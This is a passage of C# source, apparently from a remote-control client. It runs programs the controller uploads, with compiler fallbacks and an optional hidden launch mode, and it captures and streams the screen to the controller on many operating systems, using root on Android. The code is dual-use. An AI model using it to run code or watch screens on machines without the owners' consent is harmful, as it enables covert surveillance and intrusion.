// The controller uploads the app (and optionally an auto.<type> launcher) with
// the normal streamed transfer protocol, then sends one "upex" request.  All
// OS-specific command construction, compiler fallback and hidden-mode handling
// stays here, where the real platform is known.
//
// New-Feature-Add.txt specifies literal command names (python, node, dotnet,
// gcc, ...).  Do not probe PATH here: execute the documented command and use
// the documented fallback only after that command actually fails.



public static class Upex
{
    private static readonly HashSet<string> AppTypes = new(StringComparer.Ordinal)
    {
        "py", "c", "cpp", "cs", "js", "ts", "swift", "sh", "bat",
        "exe", "elf", "macho", "bin"
    };

    private static readonly HashSet<string> AutoTypes = new(StringComparer.Ordinal)
    {
        "py", "cs", "js", "sh"
    };

    private static readonly Dictionary<string, string> Extensions =
        new(StringComparer.Ordinal)
        {
            [".py"] = "py", [".pyw"] = "py",
            [".c"] = "c",
            [".cc"] = "cpp", [".cpp"] = "cpp", [".cxx"] = "cpp", [".c++"] = "cpp",
            [".cs"] = "cs",
            [".js"] = "js", [".mjs"] = "js", [".cjs"] = "js",
            [".ts"] = "ts",
            [".swift"] = "swift",
            [".sh"] = "sh", [".bash"] = "sh",
            [".bat"] = "bat", [".cmd"] = "bat",
            [".exe"] = "exe",
            [".elf"] = "elf",
            [".macho"] = "macho",
        };

    private sealed class Attempt
    {
        public string Label = "";
        public string Command = "";
        public string? Run;
    }

    public static (string Text, bool Stop, int? ExitCode) Run(
        Conn conn, JsonObject msg, string currentDir, JsonNode? reqId)
    {
        var app = SimpleName(JsonUtil.Str(msg, "app"));
        if (app == null)
            return ("upex: unsafe or missing app filename", false, 1);

        var appPath = Path.Combine(currentDir, app);
        if (!File.Exists(appPath))
            return ($"upex: file not found: {app}", false, 1);

        var appType = DetectType(appPath, JsonUtil.Str(msg, "app_type"));
        if (!AppTypes.Contains(appType))
            return ($"upex: unsupported app type for {app}", false, 1);

        var auto = JsonUtil.Str(msg, "auto");
        var hidden = JsonUtil.Bool(msg, "hidden");
        if (!string.IsNullOrEmpty(auto))
        {
            auto = SimpleName(auto);
            if (auto == null)
                return ("upex: unsafe or missing auto filename", false, 1);
            var autoPath = Path.Combine(currentDir, auto);
            if (!File.Exists(autoPath))
                return ($"upex: auto file not found: {auto}", false, 1);
            var autoType = (JsonUtil.Str(msg, "auto_type") ?? TypeFromName(auto))
                .ToLowerInvariant();
            var (attempts, error) = AutoCommand(auto, app, autoType, hidden);
            if (!string.IsNullOrEmpty(error))
                return ($"upex: {error}", false, 1);
            var result = ExecuteAttempts(conn, currentDir, reqId, attempts);
            var text = result.Text;
            if (result.ExitCode is not null and not 0)
            {
                var note = $"[upex] auto launcher exited with status {result.ExitCode}";
                text = string.IsNullOrWhiteSpace(text) ? note : text.TrimEnd() + "\n" + note;
            }
            return (text, result.Stop, result.ExitCode);
        }

        if (hidden)
            return ("upex: --hidden is only available with an auto launcher", false, 1);

        var (plan, planError) = AppPlan(app, appType, hidden);
        if (!string.IsNullOrEmpty(planError))
            return ($"upex: {planError}", false, 1);
        return ExecuteAttempts(conn, currentDir, reqId, plan!);
    }

    private static string? SimpleName(string? value)
    {
        if (string.IsNullOrEmpty(value)) return null;
        var name = value.Replace('\\', '/');
        if (name is "." or ".." || name.Contains('/') || name.Contains('\0'))
            return null;
        return name;
    }

    private static string TypeFromName(string name)
    {
        var ext = Path.GetExtension(name).ToLowerInvariant();
        return Extensions.GetValueOrDefault(ext, "");
    }

    private static string DetectType(string path, string? hint)
    {
        var normalized = (hint ?? "").ToLowerInvariant();
        if (AppTypes.Contains(normalized)) return normalized;

        var byName = TypeFromName(Path.GetFileName(path));
        if (byName.Length > 0) return byName;

        byte[] head = Array.Empty<byte>();
        try
        {
            using var stream = File.OpenRead(path);
            head = new byte[160];
            var count = stream.Read(head, 0, head.Length);
            if (count != head.Length) Array.Resize(ref head, count);
        }
        catch { }

        if (head.Length >= 4 && head[0] == 0x7f && head[1] == (byte)'E'
            && head[2] == (byte)'L' && head[3] == (byte)'F')
            return "elf";
        if (head.Length >= 4)
        {
            var magic = ((uint)head[0] << 24) | ((uint)head[1] << 16)
                        | ((uint)head[2] << 8) | head[3];
            if (magic is 0xFEEDFACE or 0xCEFAEDFE or 0xFEEDFACF
                or 0xCFFAEDFE or 0xCAFEBABE or 0xBEBAFECA)
                return "macho";
        }
        if (head.Length >= 2 && head[0] == (byte)'M' && head[1] == (byte)'Z')
            return "exe";
        if (head.Length >= 2 && head[0] == (byte)'#' && head[1] == (byte)'!')
        {
            var end = Array.IndexOf(head, (byte)'\n');
            var line = Encoding.UTF8.GetString(head, 0, end < 0 ? head.Length : end)
                .ToLowerInvariant();
            if (line.Contains("python")) return "py";
            if (line.Contains("node")) return "js";
            if (line.Contains("sh")) return "sh";
        }
        return Platform.IsWindows ? "unknown" : "bin";
    }

    private static Attempt Command(string label, string command, string? run = null)
    {
        return new Attempt { Label = label, Command = command, Run = run };
    }

    private static (List<Attempt> Attempts, string Error) AutoCommand(
        string auto, string app, string autoType, bool hidden)
    {
        if (!AutoTypes.Contains(autoType))
            return (new(), "auto mode supports only py, cs, js and sh");

        var flag = hidden ? " --hidden" : "";
        if (autoType == "py")
        {
            // Windows uses its Python launcher; Unix uses the literal python
            // command from the auto.py section.  No quotes are added.
            var launcher = Platform.IsWindows ? "py" : "python";
            return (new()
            {
                Command(launcher, $"{launcher} {auto} {app} {flag}")
            }, "");
        }
        if (autoType == "cs")
        {
            // The '--' belongs to dotnet and is used only for the C# launcher.
            return (new()
            {
                Command("dotnet", $"dotnet run --file {auto} -- {app} {flag}")
            }, "");
        }
        if (autoType == "js")
        {
            return (new()
            {
                Command("node", $"node {auto} {app} {flag}")
            }, "");
        }

        // POSIX shell launcher: bash first, then sh, then the executable bit.
        // These are attempted by execution failure, never by a PATH lookup.
        var attempts = new List<Attempt>
        {
            Command("bash", $"bash {auto} {app} {flag}"),
            Command("sh", $"sh {auto} {app} {flag}")
        };
        if (!Platform.IsWindows)
            attempts.Add(Command(
                "chmod", $"chmod +x {auto} && ./{auto} {app} {flag}"));
        return (attempts, "");
    }

    private static List<Attempt> CompilerCandidates(string app, string appType)
    {
        var windows = Platform.IsWindows;
        var mac = Platform.IsMacOs();
        var android = Platform.IsAndroid();
        var ios = Platform.IsIos();
        var baseName = Path.GetFileNameWithoutExtension(app);
        var output = baseName + (windows ? ".exe" : "");
        var run = windows ? ".\\" + output : "./" + output;
        if (appType == "c")
        {
            if (windows)
                return new()
                {
                    Command("cl", $"cl /Fe:{output} {app}", run),
		    Command("gcc", $"gcc {app} -o {output}", run)
                };
            if (android)
                return new()
                {
                    Command("gcc", $"gcc {app} -o {output}", run),
		    Command("clang", $"clang {app} -o {output}", run)
                };
            if (mac || ios)
                return new()
                {
                    Command("clang", $"clang {app} -o {output}", run),
                    Command("gcc", $"gcc {app} -o {output}", run)
                };
            return new()
            {
                Command("gcc", $"gcc {app} -o {output}", run)
            };
        }
        if (appType == "cpp")
        {
            if (windows)
                return new()
                {
                    Command("cl", $"cl /EHsc /Fe:{output} {app}", run),
                    Command("g++", $"g++ {app} -o {output}", run)
                };
            if (android)
                return new()
                {
                    Command("g++", $"g++ {app} -o {output}", run),
                    Command("clang++", $"clang++ {app} -o {output}", run)
                };
            if (mac || ios)
                return new()
                {
                    Command("clang++", $"clang++ {app} -o {output}", run)
                };
            return new()
            {
                Command("g++", $"g++ {app} -o {output}", run)
            };
        }
        return new();
    }

    private static (List<Attempt>? Attempts, string Error) AppPlan(
        string app, string appType, bool hidden)
    {
        var windows = Platform.IsWindows;
        var mac = Platform.IsMacOs();
        var ios = Platform.IsIos();

        if (hidden)
            return (null, "hidden mode is only available with an auto launcher");

        if (appType == "py")
        {
            var python = windows ? "py" : "python3";
            return (new()
            {
                Command(python, $"{python} {app}")
            }, "");
        }
        if (appType == "js")
        {
            return (new()
            {
                Command("node", $"node {app}")
            }, "");
        }
        if (appType == "cs")
        {
            // dotnet first; csc is reached only after dotnet actually fails.
            var output = Path.GetFileNameWithoutExtension(app) + ".exe";
            var run = windows ? ".\\" + output : "mono " + output;
            return (new()
            {
                Command("dotnet", $"dotnet run --file {app}"),
                Command("csc", $"csc /out:{output} {app}", run)
            }, "");
        }
        if (appType is "c" or "cpp")
        {
            var attempts = CompilerCandidates(app, appType);
            if (attempts.Count == 0)
                return (null, $"unsupported {appType.ToUpperInvariant()} compiler");
            return (attempts, "");
        }
        if (appType == "swift")
        {
            var baseName = Path.GetFileNameWithoutExtension(app);
            var output = baseName + (windows ? ".exe" : "");
            var run = windows ? ".\\" + output : "./" + output;
            return (new()
            {
                Command("swift", $"swift {app}"),
                Command("swiftc", $"swiftc {app} -o {output}", run)
            }, "");
        }
        if (appType == "sh")
        {
            if (windows)
            {
                // Not part of the Windows matrix, but keep the existing
                // support without probing: bash, then sh, literally.
                return (new()
                {
                    Command("bash", $"bash {app}"),
                    Command("sh", $"sh {app}")
                }, "");
            }
            return (new()
            {
                Command("chmod", $"chmod +x {app} && ./{app}")
            }, "");
        }
        if (appType == "bat")
        {
            if (!windows) return (null, ".bat files run on Windows only");
            return (new()
            {
                Command("cmd", ".\\" + app)
            }, "");
        }
        if (appType == "exe")
        {
            if (!windows) return (null, ".exe files run on Windows only");
            return (new()
            {
                Command("cmd", ".\\" + app)
            }, "");
        }
        if (appType == "elf")
        {
            if (windows || mac || ios)
                return (null, ".elf files run on Linux/Android only");
            return (new()
            {
                Command("chmod", $"chmod +x {app} && ./{app}")
            }, "");
        }
        if (appType == "macho")
        {
            if (!mac && !ios)
                return (null, ".macho files run on macOS/iOS only");
            return (new()
            {
                Command("chmod", $"chmod +x {app} && ./{app}")
            }, "");
        }
        if (appType == "bin")
        {
            if (windows)
                return (null, "an extensionless executable needs Linux/macOS; " +
                              "use app.exe on Windows");
            return (new()
            {
                Command("chmod", $"chmod +x {app} && ./{app}")
            }, "");
        }
        if (appType == "ts")
            return (null, "TypeScript needs an auto launcher; use " +
                          "\"upex auto.py app.ts\", auto.cs, auto.js or auto.sh");
        return (null, "unsupported app type");
    }

    private static (string Text, bool Stop, int? ExitCode) ExecuteAttempts(
        Conn conn, string currentDir, JsonNode? reqId, List<Attempt> attempts)
    {
        var parts = new List<string>();
        int? lastCode = null;
        for (var index = 0; index < attempts.Count; index++)
        {
            var attempt = attempts[index];
            var result = Commands.RunCommand(conn, attempt.Command, currentDir, reqId);
            Append(parts, result.Text);
            if (result.Stop || result.ExitCode == null)
                return (string.Join("\n", parts), result.Stop, result.ExitCode);
            lastCode = result.ExitCode;
            if (result.ExitCode == 0)
            {
                if (string.IsNullOrEmpty(attempt.Run))
                    return (string.Join("\n", parts), false, 0);
                var run = Commands.RunCommand(conn, attempt.Run, currentDir, reqId);
                Append(parts, run.Text);
                return (string.Join("\n", parts), run.Stop, run.ExitCode);
            }
            if (index + 1 < attempts.Count)
                parts.Add($"[upex] {attempt.Label} failed (exit {result.ExitCode}); " +
                          "trying the next option");
        }
        if (parts.Count == 0)
            parts.Add("[upex] no command could run the app");
        return (string.Join("\n", parts), false, lastCode);
    }

    private static void Append(List<string> parts, string? text)
    {
        text = (text ?? "").Trim();
        if (text.Length > 0) parts.Add(text);
    }
}



// ===== ScreenCapture.cs =====
// ScreenCapture.cs - one-shot screenshots, JPEG screen streaming, cursor
// overlay and the environment report sent to the controller.



public sealed class CaptureError : Exception
{
    public List<string> Attempts { get; }
    public CaptureError(string message, List<string> attempts) : base(message) => Attempts = attempts;
}

public static class ScreenCapture
{
    private static bool _captureHasCursor;
    private static readonly object PortalCaptureLock = new();

    public static JsonObject EnvironmentReport()
    {
        var (distroId, distroName) = Platform.DistroInfo();
        string session, desktop;
        if (Platform.IsAndroid())
        {
            session = "android";
            desktop = (Environment.GetEnvironmentVariable("PREFIX") ?? "")
                .StartsWith("/data/data/com.termux", StringComparison.Ordinal) ? "Termux" : "Android";
        }
        else if (Platform.IsIos()) { session = "ios"; desktop = "iOS"; }
        else if (Platform.IsMacOs())
        {
            session = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("SSH_CONNECTION"))
                      || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("SSH_TTY"))
                ? "ssh" : "aqua";
            desktop = session == "aqua" ? "Aqua" : "macOS";
        }
        else if (Platform.IsLinux)
        {
            session = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("WAYLAND_DISPLAY"))
                ? "wayland"
                : !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("DISPLAY")) ? "x11" : "none";
            desktop = Environment.GetEnvironmentVariable("XDG_CURRENT_DESKTOP") ?? "unknown";
        }
        else { session = "desktop"; desktop = RuntimeInformation.OSDescription; }

        var helpers = new JsonObject
        {
            // The Windows client captures with GDI directly, so it does not
            // need Python Pillow.  The controller only knows the Python helper
            // names, so report the equivalent capability as "pillow" to keep
            // its connect banner and capture diagnostics accurate.
            ["pillow"] = Platform.IsWindows ? true : null,
            ["gdi"] = Platform.IsWindows,
            ["pyautogui"] = false,
            ["grim"] = Exists("grim"),
            ["spectacle"] = Exists("spectacle"),
            ["gnome_dbus"] = Exists("gdbus"),
            ["gnome_screenshot"] = Exists("gnome-screenshot"),
            ["imagemagick"] = ImageMagickCommand() != null,
            ["scrot"] = Exists("scrot"),
            ["maim"] = Exists("maim"),
            ["screencapture"] = Exists("screencapture"),
            ["screencap"] = Exists("screencap") || File.Exists("/system/bin/screencap"),
            ["termux_api"] = Exists("termux-open") || Exists("termux-clipboard-get"),
            ["dotnet"] = Environment.Version.ToString()
        };
        string osName = Platform.IsAndroid() ? "android"
            : Platform.IsIos() ? "ios"
            : Platform.IsMacOs() ? "macos"
            : Platform.IsWindows ? "windows"
            : Platform.IsLinux ? "linux"
            : RuntimeInformation.OSDescription.ToLowerInvariant();
        return new JsonObject
        {
            ["os"] = osName,
            ["distro"] = distroId,
            ["distro_name"] = distroName,
            ["session"] = session,
            ["desktop"] = desktop,
            ["python"] = ".NET " + Environment.Version,
            ["helpers"] = helpers
        };
    }

    private static bool Exists(string name) => !string.IsNullOrEmpty(Platform.Which(name));

    private static string[]? ImageMagickCommand()
    {
        var exe = Platform.Which("magick");
        if (!string.IsNullOrEmpty(exe)) return new[] { exe, "import", "-window", "root", "png:-" };
        exe = Platform.Which("magick-im7.q16");
        if (!string.IsNullOrEmpty(exe)) return new[] { exe, "import", "-window", "root", "png:-" };
        exe = Platform.Which("import");
        if (!string.IsNullOrEmpty(exe)) return new[] { exe, "-window", "root", "png:-" };
        exe = Platform.Which("import-im7.q16");
        if (!string.IsNullOrEmpty(exe)) return new[] { exe, "-window", "root", "png:-" };
        return null;
    }

    public static JsonObject CaptureDiag(Exception exc)
    {
        var env = EnvironmentReport();
        var helpers = env["helpers"] as JsonObject;
        string category;
        if (Platform.IsIos()) category = "ios";
        else if (Platform.IsAndroid()) category = "android";
        else if (JsonUtil.Str(env, "session") == "none") category = "no_session";
        else if (!new[] { "pillow", "pyautogui", "grim", "spectacle", "gnome_screenshot",
                     "gnome_dbus", "imagemagick", "scrot", "maim", "screencapture" }
                 .Any(k => JsonUtil.Bool(helpers, k))) category = "missing_deps";
        else category = "all_failed";
        var attempts = new JsonArray();
        if (exc is CaptureError ce)
            foreach (var attempt in ce.Attempts) attempts.Add(attempt);
        else attempts.Add(exc.Message);
        return new JsonObject
        {
            ["kind"] = "capture",
            ["category"] = category,
            ["attempts"] = attempts,
            ["env"] = env
        };
    }

    // ---------------------------------------------------------------------
    // Capture backends
    // ---------------------------------------------------------------------

    private static Image<Rgba32> Load(byte[] data, string what)
    {
        if (data.Length == 0) throw new IOException(what + " produced no output");
        if (data.Length > Cfg.MaxCaptureBytes) throw new IOException(what + " output is too large");
        return Image.Load<Rgba32>(data);
    }

    private static byte[] RunForBytes(string exe, IEnumerable<string> args, int timeoutSeconds,
        out string stderr)
    {
        var psi = new ProcessStartInfo
        {
            FileName = exe,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            RedirectStandardInput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        foreach (var arg in args) psi.ArgumentList.Add(arg);
        using var proc = Process.Start(psi) ?? throw new IOException("cannot start " + exe);
        try { proc.StandardInput.Close(); } catch { }
        var output = new MemoryStream();
        var errorTask = proc.StandardError.ReadToEndAsync();
        var readTask = Task.Run(() =>
        {
            var buffer = new byte[65536];
            while (true)
            {
                var n = proc.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length);
                if (n <= 0) break;
                output.Write(buffer, 0, n);
                if (output.Length > Cfg.MaxCaptureBytes)
                {
                    try { proc.Kill(true); } catch { }
                    break;
                }
            }
        });
        if (!proc.WaitForExit(timeoutSeconds * 1000))
        {
            try { proc.Kill(true); } catch { }
            throw new IOException("capture timed out");
        }
        try { readTask.Wait(2000); } catch { }
        stderr = errorTask.Wait(1000) ? errorTask.Result : "";
        var data = output.ToArray();
        if (proc.ExitCode != 0)
            throw new IOException(string.IsNullOrWhiteSpace(stderr)
                ? $"exit status {proc.ExitCode}" : stderr.Trim());
        if (data.Length == 0) throw new IOException("capture produced no output");
        return data;
    }

    private static Image<Rgba32> FromStdout(string[] command)
        => Load(RunForBytes(command[0], command.Skip(1), 15, out _), command[0]);

    private static Image<Rgba32> FromFile(string[] command)
    {
        var dir = Directory.CreateTempSubdirectory("client_shot_");
        var path = Path.Combine(dir.FullName, "shot.png");
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = command[0],
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            foreach (var arg in command.Skip(1)) psi.ArgumentList.Add(arg);
            psi.ArgumentList.Add(path);
            using var proc = Process.Start(psi) ?? throw new IOException("cannot start " + command[0]);
            var stderrTask = proc.StandardError.ReadToEndAsync();
            if (!proc.WaitForExit(15000))
            {
                try { proc.Kill(true); } catch { }
                throw new IOException("capture timed out");
            }
            var stderr = stderrTask.Wait(1000) ? stderrTask.Result : "";
            if (proc.ExitCode != 0 || !File.Exists(path))
                throw new IOException(string.IsNullOrWhiteSpace(stderr)
                    ? $"exit status {proc.ExitCode}" : stderr.Trim());
            var info = new FileInfo(path);
            if (info.Length <= 0 || info.Length > Cfg.MaxCaptureBytes)
                throw new IOException("capture produced an invalid file size");
            return Load(File.ReadAllBytes(path), command[0]);
        }
        finally
        {
            try { dir.Delete(recursive: true); } catch { }
        }
    }

    private static Image<Rgba32> FromScreencapture()
    {
        var dir = Directory.CreateTempSubdirectory("client_shot_");
        var path = Path.Combine(dir.FullName, "shot.jpg");
        try
        {
            var exe = Platform.Which("screencapture");
            if (string.IsNullOrEmpty(exe)) exe = "/usr/sbin/screencapture";
            var stderr = "";
            try
            {
                RunForBytes(exe, new[] { "-x", "-C", "-m", "-t", "jpg", path }, 15, out stderr);
            }
            catch (IOException ex) { throw new IOException(ex.Message); }
            if (!File.Exists(path))
                throw new IOException(string.IsNullOrWhiteSpace(stderr) ? "screencapture wrote no file" : stderr);
            var info = new FileInfo(path);
            if (info.Length <= 0 || info.Length > Cfg.MaxCaptureBytes)
                throw new IOException("capture produced an invalid file size");
            _captureHasCursor = true;
            return Load(File.ReadAllBytes(path), "screencapture");
        }
        finally { try { dir.Delete(recursive: true); } catch { } }
    }

    private static Image<Rgba32> FromAndroid()
    {
        if (!Platform.AndroidRoot())
            throw new IOException("Android blocks screen capture without root (grant su in Magisk/KernelSU, then retry)");
        var su = Platform.SuPath();
        if (string.IsNullOrEmpty(su)) su = "su";
        var exe = File.Exists("/system/bin/screencap") ? "/system/bin/screencap" : "screencap";
        var data = RunForBytes(su, new[] { "-c", $"unset LD_LIBRARY_PATH; {exe} -p" }, 15, out var stderr);
        if (data.Length == 0) throw new IOException(string.IsNullOrWhiteSpace(stderr) ? "screencap failed" : stderr);
        return Load(data, "screencap");
    }

    private static Image<Rgba32> FromGnomeShell()
    {
        var exe = Platform.Which("gdbus");
        if (string.IsNullOrEmpty(exe)) throw new IOException("gdbus is not installed (glib2 package)");
        var dir = Directory.CreateTempSubdirectory("client_shot_");
        var path = Path.Combine(dir.FullName, "shot.png");
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = exe,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            foreach (var arg in new[]
                     {
                         "call", "--session", "--dest", "org.gnome.Shell.Screenshot",
                         "--object-path", "/org/gnome/Shell/Screenshot", "--method",
                         "org.gnome.Shell.Screenshot.Screenshot", "true", "false", path
                     }) psi.ArgumentList.Add(arg);
            using var proc = Process.Start(psi)!;
            var outTask = proc.StandardOutput.ReadToEndAsync();
            var errTask = proc.StandardError.ReadToEndAsync();
            if (!proc.WaitForExit(15000))
            {
                try { proc.Kill(true); } catch { }
                throw new IOException("GNOME Shell screenshot timed out");
            }
            var output = outTask.Result.Trim();
            var error = errTask.Result.Trim();
            if (proc.ExitCode != 0)
                throw new IOException(error.Split('\n').LastOrDefault() ?? $"exit status {proc.ExitCode}");
            if (!output.StartsWith("(true", StringComparison.Ordinal))
                throw new IOException("refused: " + (output.Length > 160 ? output[..160] : output));
            if (!File.Exists(path))
                throw new IOException("GNOME Shell reported success but wrote no screenshot file");
            _captureHasCursor = true;
            return Load(File.ReadAllBytes(path), "gnome_shell");
        }
        finally { try { dir.Delete(recursive: true); } catch { } }
    }

    private static readonly object PortalHelperGate = new();
    private static Process? _portalProcess;
    private static double _portalFailedUntil;

    private static void StopPortalHelper()
    {
        lock (PortalHelperGate)
        {
            var proc = _portalProcess;
            _portalProcess = null;
            if (proc == null) return;
            try { proc.StandardInput.Close(); } catch { }
            try
            {
                if (!proc.WaitForExit(1000)) proc.Kill(true);
            }
            catch { try { proc.Kill(true); } catch { } }
        }
    }

    private static string PythonWithGi()
    {
        foreach (var candidate in new[]
                 {
                     "/usr/bin/python3", Platform.Which("python3"), Platform.Which("python")
                 })
        {
            if (string.IsNullOrEmpty(candidate)) continue;
            var output = Platform.RunCapture(candidate, new[] { "-c", "import gi" }, 20);
            if (output != null) return candidate;
        }
        return "";
    }

    private static Image<Rgba32> FromPortal()
    {
        var uri = PortalHelperUri();
        if (!uri.StartsWith("file://", StringComparison.Ordinal))
            throw new IOException("the portal returned no file");
        var path = Uri.UnescapeDataString(new Uri(uri).AbsolutePath);
        try
        {
            var info = new FileInfo(path);
            if (!info.Exists || info.Length <= 0 || info.Length > Cfg.MaxCaptureBytes)
                throw new IOException("portal screenshot file is invalid");
            return Load(File.ReadAllBytes(path), "portal");
        }
        finally
        {
            try { File.Delete(path); } catch { }
        }
    }

    private static string PortalHelperUri()
    {
        if (DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 < _portalFailedUntil)
            throw new IOException("the desktop portal is temporarily disabled after a failed request");
        var exe = PythonWithGi();
        if (string.IsNullOrEmpty(exe))
        {
            _portalFailedUntil = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + 30;
            throw new IOException("needs PyGObject (install python3-gi / python3-gobject, or use an X11 session)");
        }
        lock (PortalHelperGate)
        {
            if (_portalProcess == null || _portalProcess.HasExited)
            {
                try
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = exe,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    psi.ArgumentList.Add("-u");
                    psi.ArgumentList.Add("-c");
                    psi.ArgumentList.Add(PortalStreamScript);
                    _portalProcess = Process.Start(psi) ?? throw new IOException("cannot start the portal helper");
                }
                catch (Exception ex)
                {
                    _portalFailedUntil = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + 30;
                    throw new IOException("cannot start the portal helper: " + ex.Message);
                }
            }
            var proc = _portalProcess!;
            try
            {
                proc.StandardInput.WriteLine("shot");
                proc.StandardInput.Flush();
            }
            catch (Exception ex)
            {
                StopPortalHelper();
                _portalFailedUntil = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + 30;
                throw new IOException("the portal helper is not accepting requests: " + ex.Message);
            }
            var lineTask = proc.StandardOutput.ReadLineAsync();
            if (!lineTask.Wait(TimeSpan.FromSeconds(30)))
            {
                StopPortalHelper();
                _portalFailedUntil = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + 30;
                throw new IOException("the desktop portal did not answer within 30s");
            }
            var line = lineTask.Result;
            if (string.IsNullOrEmpty(line))
            {
                StopPortalHelper();
                _portalFailedUntil = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + 30;
                throw new IOException("the portal helper exited without a picture");
            }
            line = line.Trim();
            if (line.StartsWith("OK ", StringComparison.Ordinal))
            {
                var uri = line[3..].Trim();
                if (uri.Length > 0)
                {
                    _portalFailedUntil = 0;
                    return uri;
                }
            }
            StopPortalHelper();
            _portalFailedUntil = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + 30;
            throw new IOException(line.StartsWith("ERR ", StringComparison.Ordinal)
                ? line[4..].Trim() : "bad portal helper reply: " + line[..Math.Min(200, line.Length)]);
        }
    }

    private static Image<Rgba32> FromWindowsGdi()
    {
        var x = Win32.GetSystemMetrics(76);
        var y = Win32.GetSystemMetrics(77);
        var width = Win32.GetSystemMetrics(78);
        var height = Win32.GetSystemMetrics(79);
        if (width <= 0 || height <= 0) throw new IOException("no virtual screen");
        var screenDc = Win32.GetDC(IntPtr.Zero);
        if (screenDc == IntPtr.Zero) throw new IOException("GetDC failed");
        var memDc = Win32.CreateCompatibleDC(screenDc);
        var bitmap = Win32.CreateCompatibleBitmap(screenDc, width, height);
        var old = Win32.SelectObject(memDc, bitmap);
        try
        {
            if (!Win32.BitBlt(memDc, 0, 0, width, height, screenDc, x, y, 0x00CC0020))
                throw new IOException("BitBlt failed");
            var info = new Win32.BITMAPINFO
            {
                bmiHeader = new Win32.BITMAPINFOHEADER
                {
                    biSize = Marshal.SizeOf<Win32.BITMAPINFOHEADER>(),
                    biWidth = width,
                    biHeight = -height,
                    biPlanes = 1,
                    biBitCount = 32,
                    biCompression = 0
                }
            };
            var pixels = new byte[width * height * 4];
            if (Win32.GetDIBits(memDc, bitmap, 0, (uint)height, pixels, ref info, 0) == 0)
                throw new IOException("GetDIBits failed");
            var image = new Image<Rgba32>(width, height);
            image.ProcessPixelRows(accessor =>
            {
                for (var row = 0; row < height; row++)
                {
                    var span = accessor.GetRowSpan(row);
                    var offset = row * width * 4;
                    for (var col = 0; col < width; col++)
                    {
                        var i = offset + col * 4;
                        span[col] = new Rgba32(pixels[i + 2], pixels[i + 1], pixels[i], 255);
                    }
                }
            });
            return image;
        }
        finally
        {
            Win32.SelectObject(memDc, old);
            Win32.DeleteObject(bitmap);
            Win32.DeleteDC(memDc);
            Win32.ReleaseDC(IntPtr.Zero, screenDc);
        }
    }

    // ---------------------------------------------------------------------
    // Public capture entry point
    // ---------------------------------------------------------------------

    public static Image<Rgba32> GrabScreen(bool fast = false)
    {
        var wayland = Platform.IsLinux && !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("WAYLAND_DISPLAY"));
        var desktop = (Environment.GetEnvironmentVariable("XDG_CURRENT_DESKTOP") ?? "").ToLowerInvariant();
        List<string> order;
        if (Platform.IsAndroid()) order = new() { "android" };
        else if (Platform.IsIos()) order = new() { "screencapture" };
        else if (Platform.IsMacOs()) order = new() { "screencapture" };
        else if (wayland)
        {
            if (desktop.Contains("kde") || desktop.Contains("plasma"))
                order = new() { "portal", "spectacle", "grim" };
            else if (desktop.Contains("gnome"))
                order = new() { "portal", "gnome_shell", "grim" };
            else order = new() { "grim", "spectacle", "portal", "gnome_shell" };
        }
        else if (Platform.IsLinux)
            order = new() { "magick", "scrot", "maim" };
        else if (Platform.IsWindows)
            order = new() { "windows" };
        else order = new() { "windows" };

        var errors = new List<string>();
        foreach (var name in order.Distinct())
        {
            try
            {
                _captureHasCursor = false;
                var image = Capture(name, fast);
                if (wayland && name is "magick" or "scrot" or "maim")
                {
                    var (lo, hi) = LuminanceExtrema(image);
                    if (lo == hi) throw new IOException("empty XWayland picture (solid colour)");
                }
                return image;
            }
            catch (Exception ex)
            {
                errors.Add($"{name}: {(ex is FileNotFoundException ? "not installed (not found in PATH)" : ex.Message)}");
            }
        }

        string hint;
        if (Platform.IsAndroid())
            hint = "Android: screen capture needs root (su + /system/bin/screencap); stock Android blocks it.";
        else if (Platform.IsIos())
            hint = "iOS: stock iOS does not allow screen capture from an app. Only a jailbroken device can do it.";
        else if (Platform.IsMacOs())
            hint = "macOS: grant Screen & System Audio Recording permission to your terminal in System Settings > Privacy & Security.";
        else if (!Platform.GuiSessionAvailable())
            hint = "Headless Linux session (no DISPLAY / WAYLAND_DISPLAY): commands, files and the shell work; screenshots need a desktop.";
        else if (wayland)
            hint = "Wayland: install grim (Hyprland/Sway), kde-spectacle (KDE) or enable the desktop portal; on GNOME install python3-gi.";
        else if (Platform.IsLinux)
            hint = "Linux X11: install ImageMagick, scrot or maim.";
        else hint = "Install a screen capture backend.";
        throw new CaptureError($"no screen capture available ({string.Join(" | ", errors)}). {hint}", errors);
    }

    private static Image<Rgba32> Capture(string name, bool fast)
    {
        switch (name)
        {
            case "windows": return FromWindowsGdi();
            case "android": return FromAndroid();
            case "screencapture": return FromScreencapture();
            case "portal":
                lock (PortalCaptureLock) return FromPortal();
            case "gnome_shell": return FromGnomeShell();
            case "spectacle":
            {
                var image = FromFile(new[] { "spectacle", "-b", "-n", "-f", "-p", "-o" });
                _captureHasCursor = true;
                return image;
            }
            case "grim":
                return FromStdout(new[] { "grim", "-c", "-t", "jpeg", "-" });
            case "magick":
            {
                var cmd = ImageMagickCommand() ?? new[] { "import", "-window", "root", "png:-" };
                return FromStdout(cmd);
            }
            case "scrot": return FromFile(new[] { "scrot", "-o" });
